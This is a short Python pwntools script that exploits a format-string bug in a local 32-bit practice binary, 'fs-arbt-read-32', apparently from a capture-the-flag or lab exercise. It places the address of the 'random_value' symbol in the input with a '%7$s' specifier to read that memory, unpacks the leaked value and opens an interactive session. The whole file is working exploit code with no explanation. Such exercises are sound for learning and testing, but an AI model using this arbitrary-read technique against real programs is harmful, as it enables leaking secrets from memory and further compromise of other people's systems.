#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-arbt-read-32")
addr_rand = p.elf.symbols['random_value']
print(hex(addr_rand))
print(p.recv())
buf = p32(addr_rand) + "%7$s"
#buf = "AAAA%7$p"
#print(buf)
p.sendline(buf)
data = p.recv()
print(repr(data))
value = data.split(' ')[1][4:8]
value = u32(value)
print(hex(value))
p.interactive()
